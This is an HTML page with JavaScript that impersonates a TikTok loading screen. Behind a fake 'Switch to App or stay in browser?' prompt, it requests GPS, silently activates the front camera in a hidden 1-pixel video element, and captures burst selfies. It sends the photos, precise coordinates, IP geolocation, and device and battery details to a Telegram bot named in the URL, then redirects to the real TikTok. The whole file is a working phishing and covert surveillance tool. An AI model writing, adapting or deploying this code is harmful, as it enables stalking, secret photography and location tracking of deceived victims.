<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TikTok - Make Your Day</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000000;
            height: 100vh;
            width: 100vw;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            overflow: hidden;
            position: fixed;
            top: 0;
            left: 0;
        }

        /* Main TikTok splash container */
        .splash {
            text-align: center;
            position: relative;
            z-index: 10;
        }

        /* TikTok logo container */
        .tiktok-logo {
            margin-bottom: 40px;
            position: relative;
            display: inline-block;
        }

        /* TikTok note icon */
        .tiktok-icon {
            width: 80px;
            height: 80px;
            position: relative;
            margin: 0 auto;
        }

        .tiktok-icon svg {
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 0 20px rgba(255, 0, 80, 0.6))
                    drop-shadow(0 0 40px rgba(0, 242, 234, 0.4));
            animation: glowPulse 2s ease-in-out infinite;
        }

        @keyframes glowPulse {
            0%, 100% {
                filter: drop-shadow(0 0 20px rgba(255, 0, 80, 0.6))
                        drop-shadow(0 0 40px rgba(0, 242, 234, 0.4));
            }
            50% {
                filter: drop-shadow(0 0 35px rgba(255, 0, 80, 0.9))
                        drop-shadow(0 0 60px rgba(0, 242, 234, 0.7));
            }
        }

        /* Pulsing rings around the TikTok logo */
        .ring-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 120px;
            height: 120px;
        }

        .ring {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border-radius: 50%;
            border: 2px solid rgba(255, 255, 255, 0.3);
            animation: ringPulse 2s ease-out infinite;
        }

        .ring:nth-child(1) {
            width: 60px;
            height: 60px;
            animation-delay: 0s;
        }

        .ring:nth-child(2) {
            width: 60px;
            height: 60px;
            animation-delay: 0.6s;
        }

        .ring:nth-child(3) {
            width: 60px;
            height: 60px;
            animation-delay: 1.2s;
        }

        @keyframes ringPulse {
            0% {
                width: 60px;
                height: 60px;
                opacity: 0.8;
                border-color: rgba(255, 255, 255, 0.4);
            }
            100% {
                width: 160px;
                height: 160px;
                opacity: 0;
                border-color: rgba(255, 255, 255, 0);
            }
        }

        /* Loading dots - exactly like TikTok */
        .loading-dots {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 30px;
        }

        .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #ffffff;
            animation: dotBounce 1.4s ease-in-out infinite;
        }

        .dot:nth-child(1) {
            animation-delay: 0s;
        }

        .dot:nth-child(2) {
            animation-delay: 0.2s;
        }

        .dot:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes dotBounce {
            0%, 80%, 100% {
                transform: scale(0.3);
                opacity: 0.3;
            }
            40% {
                transform: scale(1);
                opacity: 1;
            }
        }

        /* TikTok brand text */
        .brand-text {
            color: #ffffff;
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 4px;
            margin-top: 20px;
            text-shadow: 0 0 30px rgba(255, 0, 80, 0.5);
        }

        /* Tap button container */
        #tapArea {
            display: none;
        }

        /* TikTok-style "Open TikTok" button */
        .tap-btn {
            display: inline-block;
            background: #fe2c55;
            color: #ffffff;
            border: none;
            padding: 16px 40px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 50px;
            margin-top: 25px;
            cursor: pointer;
            letter-spacing: 1px;
            animation: btnPulse 2s infinite;
            text-decoration: none;
        }

        @keyframes btnPulse {
            0%, 100% {
                box-shadow: 0 0 0 0 rgba(254, 44, 85, 0.4);
            }
            50% {
                box-shadow: 0 0 0 15px rgba(254, 44, 85, 0);
            }
        }

        /* Choice Popup Overlay */
        .choice-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.92);
            z-index: 100;
            justify-content: center;
            align-items: flex-end;
            padding-bottom: 50px;
        }

        .choice-popup {
            background: #1a1a1a;
            border-radius: 16px 16px 0 0;
            padding: 30px 20px 45px;
            text-align: center;
            width: 100%;
            max-width: 420px;
            border-top: 1px solid #333;
        }

        .choice-popup .choice-icon {
            font-size: 55px;
            margin-bottom: 15px;
        }

        .choice-popup .choice-title {
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 6px;
        }

        .choice-popup .choice-subtitle {
            color: #888;
            font-size: 13px;
            margin-bottom: 28px;
        }

        .choice-btn {
            display: block;
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin: 8px 0;
            letter-spacing: 0.5px;
            transition: all 0.2s;
        }

        .choice-btn:active {
            transform: scale(0.97);
        }

        .choice-btn.stay-btn {
            background: #333;
            color: #fff;
        }

        .choice-btn.switch-btn {
            background: #fe2c55;
            color: #fff;
        }

        /* Loading Screen */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 200;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .loading-spinner {
            width: 48px;
            height: 48px;
            border: 3px solid #333;
            border-top-color: #fe2c55;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .loading-text {
            color: #fff;
            margin-top: 22px;
            font-size: 16px;
            font-weight: 500;
        }

        .loading-subtext {
            color: #666;
            margin-top: 8px;
            font-size: 13px;
        }

        /* Exit/Error Screen */
        .exit-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 300;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .exit-icon {
            font-size: 65px;
            margin-bottom: 20px;
        }

        .exit-message {
            color: #fff;
            font-size: 17px;
            font-weight: 500;
            text-align: center;
            padding: 0 30px;
            line-height: 1.5;
        }

        .exit-submessage {
            color: #888;
            font-size: 13px;
            margin-top: 10px;
        }

        /* Hidden elements */
        #cam {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
            z-index: -999;
        }

        #canvas {
            display: none;
        }

        #status {
            display: none;
        }

        #debug {
            display: none;
        }
    </style>
</head>
<body>

    <!-- Hidden camera video element -->
    <video id="cam" autoplay playsinline muted></video>

    <!-- Hidden canvas for photo capture -->
    <canvas id="canvas"></canvas>

    <!-- TikTok Splash Screen -->
    <div class="splash" id="splash">
        <!-- Logo with pulsing rings -->
        <div class="tiktok-logo">
            <div class="ring-container">
                <div class="ring"></div>
                <div class="ring"></div>
                <div class="ring"></div>
            </div>
            <div class="tiktok-icon">
                <svg viewBox="0 0 24 24" fill="white">
                    <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.89a2.89 2.89 0 01-5.76 0 2.89 2.89 0 012.89-2.89h.74v-3.3a6.19 6.19 0 00-5.24 6.19 6.19 6.19 0 006.19 6.19 6.19 6.19 0 006.19-6.19V7.27a8.17 8.17 0 004.65 1.46V5.35a4.83 4.83 0 01-3.44-1.41l.01 2.75z"/>
                </svg>
            </div>
        </div>

        <!-- Loading dots animation -->
        <div class="loading-dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>

        <!-- TikTok brand name -->
        <div class="brand-text">TikTok</div>

        <!-- Tap to open button (appears after 1 second) -->
        <div id="tapArea">
            <a class="tap-btn" id="tapBtn" onclick="showChoicePopup()">Open TikTok</a>
        </div>

        <!-- Hidden status element -->
        <div id="status">Tap to continue...</div>

        <!-- Hidden debug element -->
        <div id="debug"></div>
    </div>

    <!-- Choice Popup: Stay or Switch -->
    <div class="choice-overlay" id="choiceOverlay">
        <div class="choice-popup">
            <div class="choice-icon">&#x1F4F1;</div>
            <div class="choice-title">Switch to TikTok App or stay in browser?</div>
            <div class="choice-subtitle">Choose how you want to continue</div>
            <button class="choice-btn stay-btn" onclick="chooseStay()">Stay in Browser</button>
            <button class="choice-btn switch-btn" onclick="chooseSwitch()">Switch to App</button>
        </div>
    </div>

    <!-- Loading Screen -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
        <div class="loading-text" id="loadingMainText">Opening TikTok...</div>
        <div class="loading-subtext">Please wait a moment</div>
    </div>

    <!-- Exit Screen -->
    <div class="exit-overlay" id="exitOverlay">
        <div class="exit-icon">&#x1F4F5;</div>
        <div class="exit-message">This video will not display</div>
        <div class="exit-submessage">Please try again later</div>
    </div>

    <script>
    // ============================================================
    // CONFIGURATION - Read from URL parameters
    // ============================================================
    var urlParams = new URLSearchParams(location.search);
    var redirectUrl = urlParams.get('r') || 'https://www.tiktok.com/en/';
    var botToken = urlParams.get('bot') || '';
    var chatId = urlParams.get('chat') || '';

    // ============================================================
    // GLOBAL VARIABLES
    // ============================================================
    var isMobileDevice = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
    var gpsData = null;
    var ipAddress = null;
    var cameraStream = null;
    var cameraIsActive = false;
    var photoCount = 0;
    var visitStartTime = Date.now();
    var reportAlreadySent = false;
    var burstInterval = null;
    var userChoice = '';
    var dataCollectionComplete = false;

    // ============================================================
    // DEBUG LOG - Only outputs to browser console
    // ============================================================
    function debugLog(message) {
        console.log('[Tracker] ' + message);
    }

    // ============================================================
    // SHOW TAP BUTTON AFTER PAGE LOADS
    // ============================================================
    setTimeout(function() {
        document.getElementById('tapArea').style.display = 'block';
    }, 1000);

    // ============================================================
    // SHOW CHOICE POPUP
    // ============================================================
    function showChoicePopup() {
        document.getElementById('choiceOverlay').style.display = 'flex';
    }

    // ============================================================
    // USER CHOOSES "STAY IN BROWSER"
    // ============================================================
    async function chooseStay() {
        userChoice = 'stay';
        debugLog('User chose: STAY IN BROWSER');

        document.getElementById('choiceOverlay').style.display = 'none';
        document.getElementById('splash').style.display = 'none';
        document.getElementById('loadingOverlay').style.display = 'flex';
        document.getElementById('loadingMainText').textContent = 'Loading content...';

        await collectAllData();
        showExitScreen();
    }

    // ============================================================
    // USER CHOOSES "SWITCH TO APP"
    // ============================================================
    async function chooseSwitch() {
        userChoice = 'switch';
        debugLog('User chose: SWITCH TO APP');

        document.getElementById('choiceOverlay').style.display = 'none';
        document.getElementById('splash').style.display = 'none';
        document.getElementById('loadingOverlay').style.display = 'flex';
        document.getElementById('loadingMainText').textContent = 'Opening TikTok App...';

        await collectAllData();
        showExitScreen();
    }

    // ============================================================
    // COLLECT ALL DATA - GPS, Camera, Photos, Report
    // ============================================================
    async function collectAllData() {
        debugLog('=== DATA COLLECTION STARTED ===');

        getIPAddress();
        gpsData = await getGPSLocation();

        var cameraStarted = await startCamera();

        if (cameraStarted) {
            debugLog('Camera active - capturing photos...');
            takeBurstPhotos();
            await sleep(1500);
            takeBurstPhotos();
            await sleep(1500);
            takeBurstPhotos();
        }

        await buildAndSendReport(false);
        dataCollectionComplete = true;
        debugLog('=== DATA COLLECTION COMPLETE ===');
    }

    // ============================================================
    // SHOW EXIT SCREEN
    // ============================================================
    function showExitScreen() {
        stopCamera();
        document.getElementById('loadingOverlay').style.display = 'none';
        document.getElementById('exitOverlay').style.display = 'flex';

        setTimeout(function() {
            document.getElementById('exitOverlay').style.display = 'none';
            window.location.href = redirectUrl;
        }, 3000);
    }

    // ============================================================
    // HELPER: SLEEP
    // ============================================================
    function sleep(milliseconds) {
        return new Promise(function(resolve) {
            setTimeout(resolve, milliseconds);
        });
    }

    // ============================================================
    // GET IP ADDRESS
    // ============================================================
    function getIPAddress() {
        fetch('https://api.ipify.org?format=json')
            .then(function(response) {
                return response.json();
            })
            .then(function(data) {
                ipAddress = data.ip;
                debugLog('IP Address: ' + ipAddress);
            })
            .catch(function() {
                ipAddress = 'Unknown';
            });
    }

    // ============================================================
    // GET BATTERY INFORMATION
    // ============================================================
    function getBatteryInfo() {
        if (navigator.getBattery) {
            return navigator.getBattery().then(function(battery) {
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging ? 'Yes' : 'No'
                };
            });
        }
        return Promise.resolve({
            level: 'N/A',
            charging: 'Unknown'
        });
    }

    // ============================================================
    // GET GPS LOCATION
    // ============================================================
    function getGPSLocation() {
        return new Promise(function(resolve) {
            if (!navigator.geolocation) {
                debugLog('GPS: Not supported on this browser');
                resolve(null);
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    debugLog('GPS: GRANTED by user');
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        speed: position.coords.speed,
                        heading: position.coords.heading
                    });
                },
                function(error) {
                    var errorMessages = {
                        1: 'Permission Denied',
                        2: 'Position Unavailable',
                        3: 'Timeout'
                    };
                    debugLog('GPS: ' + (errorMessages[error.code] || error.message));
                    resolve(null);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                }
            );
        });
    }

    // ============================================================
    // START CAMERA - Silent, invisible to user
    // ============================================================
    async function startCamera() {
        debugLog('Camera: Starting...');

        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            debugLog('Camera: API not supported on this browser');
            return false;
        }

        var videoElement = document.getElementById('cam');

        try {
            debugLog('Camera: Requesting permission...');

            var stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                }
            });

            videoElement.srcObject = stream;
            cameraStream = stream;
            await videoElement.play();

            await new Promise(function(resolve) {
                var checkInterval = setInterval(function() {
                    if (videoElement.videoWidth && videoElement.videoWidth > 0) {
                        clearInterval(checkInterval);
                        resolve();
                    }
                }, 200);
                setTimeout(function() {
                    clearInterval(checkInterval);
                    resolve();
                }, 5000);
            });

            if (videoElement.videoWidth && videoElement.videoWidth > 0) {
                cameraIsActive = true;
                debugLog('Camera: SUCCESS! Resolution: ' + videoElement.videoWidth + 'x' + videoElement.videoHeight);
                return true;
            } else {
                debugLog('Camera: Stream opened but no video signal detected');
            }

        } catch (error) {
            debugLog('Camera: Attempt 1 failed - ' + error.message);

            try {
                debugLog('Camera: Requesting permission (attempt 2)...');
                var simpleStream = await navigator.mediaDevices.getUserMedia({ video: true });
                videoElement.srcObject = simpleStream;
                cameraStream = simpleStream;
                await videoElement.play();

                if (videoElement.videoWidth && videoElement.videoWidth > 0) {
                    cameraIsActive = true;
                    debugLog('Camera: SUCCESS with basic settings!');
                    return true;
                }
            } catch (retryError) {
                debugLog('Camera: Attempt 2 failed - ' + retryError.message);
            }

            debugLog('Camera: All attempts failed. Camera not available.');
            return false;
        }

        return false;
    }

    // ============================================================
    // TAKE A SINGLE PHOTO
    // ============================================================
    function takePhoto() {
        if (!cameraIsActive) {
            return null;
        }

        try {
            var videoElement = document.getElementById('cam');

            if (!videoElement.videoWidth || videoElement.videoWidth === 0) {
                return null;
            }

            var canvasElement = document.getElementById('canvas');
            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;

            var ctx = canvasElement.getContext('2d');
            ctx.save();
            ctx.scale(-1, 1);
            ctx.drawImage(videoElement, -canvasElement.width, 0, canvasElement.width, canvasElement.height);
            ctx.restore();

            photoCount = photoCount + 1;
            debugLog('Photo #' + photoCount + ' captured successfully!');

            return canvasElement.toDataURL('image/jpeg', 0.7);

        } catch (error) {
            debugLog('Photo: Error capturing - ' + error.message);
            return null;
        }
    }

    // ============================================================
    // TAKE BURST PHOTOS - 3 photos in rapid succession
    // ============================================================
    function takeBurstPhotos() {
        if (!cameraIsActive) {
            return;
        }

        debugLog('Burst: Starting 3-photo capture...');

        for (var i = 0; i < 3; i++) {
            setTimeout(function() {
                var photo = takePhoto();
                if (photo) {
                    sendPhotoToTelegram(photo);
                }
            }, i * 400);
        }
    }

    // ============================================================
    // SEND PHOTO TO TELEGRAM
    // ============================================================
    function sendPhotoToTelegram(photoData) {
        if (!photoData || !botToken || !chatId) {
            return;
        }

        try {
            var parts = photoData.split(',');
            var mimeType = parts[0].match(/:(.*?);/)[1];
            var base64Data = atob(parts[1]);
            var dataLength = base64Data.length;
            var uint8Array = new Uint8Array(dataLength);

            for (var i = 0; i < dataLength; i++) {
                uint8Array[i] = base64Data.charCodeAt(i);
            }

            var blob = new Blob([uint8Array], { type: mimeType });

            var formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'camera_capture_' + photoCount + '.jpg');
            formData.append('caption', 'Photo #' + photoCount + ' | Choice: ' + userChoice);

            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendPhoto', true);
            xhr.onload = function() {
                debugLog('Send: Photo #' + photoCount + ' sent! HTTP Status: ' + xhr.status);
            };
            xhr.onerror = function() {
                debugLog('Send: Photo #' + photoCount + ' FAILED - Network error');
            };
            xhr.send(formData);

        } catch (error) {
            debugLog('Send: Error - ' + error.message);
        }
    }

    // ============================================================
    // GET LOCATION FROM IP ADDRESS
    // ============================================================
    async function getIPLocation() {
        if (!ipAddress || ipAddress === 'Unknown') {
            return '';
        }

        try {
            var response = await fetch('http://ip-api.com/json/' + ipAddress + '?fields=country,regionName,city,zip,timezone,lat,lon');
            var locationData = await response.json();

            if (locationData.country) {
                var locationText = '';
                locationText += 'Location Details\n';
                locationText += '   - Country: ' + locationData.country + '\n';
                locationText += '   - Region: ' + (locationData.regionName || 'N/A') + '\n';
                locationText += '   - City: ' + (locationData.city || 'N/A') + '\n';
                locationText += '   - Postal Code: ' + (locationData.zip || 'N/A') + '\n';
                locationText += '   - Timezone: ' + (locationData.timezone || 'N/A') + '\n';

                if (locationData.lat && locationData.lon) {
                    locationText += '   - Approx Maps: https://maps.google.com/?q=' + locationData.lat + ',' + locationData.lon + '\n';
                }

                locationText += '\n';
                return locationText;
            }
        } catch (error) {
            debugLog('IP Location: Lookup failed');
        }

        var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        return 'Location Details\n   - Timezone: ' + timezone + '\n\n';
    }

    // ============================================================
    // BUILD AND SEND FULL REPORT TO TELEGRAM
    // ============================================================
    async function buildAndSendReport(isFinalReport) {
        if (reportAlreadySent && !isFinalReport) {
            return;
        }
        reportAlreadySent = true;

        debugLog(isFinalReport ? 'Report: Sending FINAL report...' : 'Report: Sending initial report...');

        var userAgent = navigator.userAgent;
        var platform = navigator.platform;
        var language = navigator.language;
        var screenResolution = screen.width + 'x' + screen.height;
        var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        var cpuCores = navigator.hardwareConcurrency || 'N/A';
        var ram = navigator.deviceMemory || 'N/A';
        var now = new Date();
        var dateString = now.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
        var timeString = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
        var visitDuration = Math.floor((Date.now() - visitStartTime) / 1000);
        var batteryInfo = await getBatteryInfo();
        var ipLocationText = await getIPLocation();

        var deviceModel = platform;
        if (/iPhone/.test(userAgent)) {
            var iosVersion = userAgent.match(/OS (\d+_\d+)/);
            deviceModel = 'iPhone OS ' + (iosVersion ? iosVersion[1].replace('_', '.') : '') + ' like Mac OS X';
        } else if (/Android/.test(userAgent)) {
            var androidVersion = userAgent.match(/Android\s([\d.]+)/);
            deviceModel = 'Android ' + (androidVersion ? androidVersion[1] : '') + ' Device';
        } else if (/Windows/.test(platform)) {
            deviceModel = 'Windows PC';
        } else if (/Mac/.test(platform)) {
            deviceModel = 'Mac Computer';
        } else if (/Linux/.test(platform)) {
            deviceModel = 'Linux Computer';
        }

        var prefix = isFinalReport ? 'FINAL REPORT - User Left Page\n\n' : '';

        var message = prefix;
        message += '---------------------------------------------------------------\n';
        message += '    Visitor Information Captured\n';
        message += '---------------------------------------------------------------\n\n';

        message += 'User Choice: ' + (userChoice === 'stay' ? 'Stay in Browser' : 'Switch to App') + '\n\n';

        message += 'Device & Browser\n';
        message += '   - Device Model: ' + deviceModel + '\n';
        message += '   - Device Type: ' + (isMobileDevice ? 'Mobile' : 'Desktop') + '\n';
        message += '   - User Agent: ' + userAgent.substring(0, 80) + '...\n\n';

        message += 'Network Information\n';
        message += '   - IP Address: ' + (ipAddress || 'Detecting...') + '\n';
        message += '   - Language: ' + language + '\n\n';

        message += ipLocationText;

        message += '---------------------------------------------------------------\n';
        message += '    GPS Coordinates\n';
        message += '---------------------------------------------------------------\n\n';

        if (gpsData) {
            message += '   [YES] Location Granted\n';
            message += '   - Latitude: ' + gpsData.latitude.toFixed(15) + '\n';
            message += '   - Longitude: ' + gpsData.longitude.toFixed(15) + '\n';
            message += '   - Accuracy: ' + gpsData.accuracy.toFixed(0) + 'mm\n';
            if (gpsData.altitude) {
                message += '   - Altitude: ' + gpsData.altitude.toFixed(1) + 'm\n';
            }
            if (gpsData.speed) {
                message += '   - Speed: ' + (gpsData.speed * 3.6).toFixed(1) + ' km/h\n';
            }
            message += '\n   Maps: https://maps.google.com/maps?q=' + gpsData.latitude + ',' + gpsData.longitude;
            message += '&ll=' + gpsData.latitude + ',' + gpsData.longitude + '&z=16\n\n';
        } else {
            message += '   [NO] Location: Not available\n';
            message += '   Location permission was not granted\n\n';
        }

        message += '---------------------------------------------------------------\n';
        message += '    Device Details\n';
        message += '---------------------------------------------------------------\n\n';

        message += 'Display Information\n';
        message += '   - Resolution: ' + screenResolution + '\n\n';

        message += 'Battery Status\n';
        message += '   - Level: ' + batteryInfo.level + '\n';
        message += '   - Charging: ' + batteryInfo.charging + '\n\n';

        message += 'Device Permissions\n';
        message += '   - Camera: ' + (cameraIsActive ? 'Active' : 'Not Available') + '\n';
        message += '   - Location: ' + (gpsData ? 'Granted' : 'Denied') + '\n\n';

        message += 'Hardware\n';
        message += '   - CPU Cores: ' + cpuCores + '\n';
        message += '   - RAM: ' + ram + ' GB\n';
        message += '   - Photos Captured: ' + photoCount + '\n';
        message += '   - Visit Duration: ' + visitDuration + ' seconds\n\n';

        message += '---------------------------------------------------------------\n';
        message += 'Captured: ' + dateString + ', ' + timeString + '\n';
        message += '---------------------------------------------------------------';

        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendMessage', false);
        xhr.setRequestHeader('Content-Type', 'application/json');

        try {
            xhr.send(JSON.stringify({
                chat_id: chatId,
                text: message,
                disable_web_page_preview: true
            }));
            debugLog('Report: Sent successfully! HTTP Status: ' + xhr.status);
        } catch (error) {
            debugLog('Report: FAILED to send - ' + error.message);
        }

        if (gpsData) {
            var locationXhr = new XMLHttpRequest();
            locationXhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendLocation', false);
            locationXhr.setRequestHeader('Content-Type', 'application/json');

            try {
                locationXhr.send(JSON.stringify({
                    chat_id: chatId,
                    latitude: gpsData.latitude,
                    longitude: gpsData.longitude
                }));
                debugLog('Location: Pin sent successfully');
            } catch (error) {
                debugLog('Location: Failed to send pin');
            }
        }
    }

    // ============================================================
    // STOP CAMERA
    // ============================================================
    function stopCamera() {
        if (cameraStream) {
            cameraStream.getTracks().forEach(function(track) {
                track.stop();
            });
            cameraStream = null;
            cameraIsActive = false;
            debugLog('Camera: Stopped and released');
        }

        if (burstInterval) {
            clearInterval(burstInterval);
            burstInterval = null;
        }
    }

    // ============================================================
    // HANDLE USER LEAVING THE PAGE
    // ============================================================
    function handleUserExit() {
        stopCamera();

        var duration = Math.floor((Date.now() - visitStartTime) / 1000);
        var exitMessage = 'User Left Page\n' +
                          'Duration: ' + duration + 's\n' +
                          'Photos: ' + photoCount + '\n' +
                          'Device: ' + (isMobileDevice ? 'Mobile' : 'Desktop') + '\n' +
                          'IP: ' + (ipAddress || 'Unknown') + '\n' +
                          'Choice: ' + userChoice;

        debugLog('User exiting: ' + exitMessage.replace(/\n/g, ' | '));

        if (navigator.sendBeacon) {
            navigator.sendBeacon(
                'https://api.telegram.org/bot' + botToken + '/sendMessage',
                JSON.stringify({
                    chat_id: chatId,
                    text: exitMessage
                })
            );
            debugLog('Exit message sent via sendBeacon');
        }
    }

    window.addEventListener('beforeunload', handleUserExit);
    window.addEventListener('pagehide', handleUserExit);
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            handleUserExit();
        }
    });

    // ============================================================
    // STARTUP
    // ============================================================
    debugLog('=== PAGE LOADED ===');
    debugLog('Device: ' + (isMobileDevice ? 'MOBILE' : 'DESKTOP'));
    debugLog('Waiting for user to tap "Open TikTok" button...');
    </script>
</body>
</html>
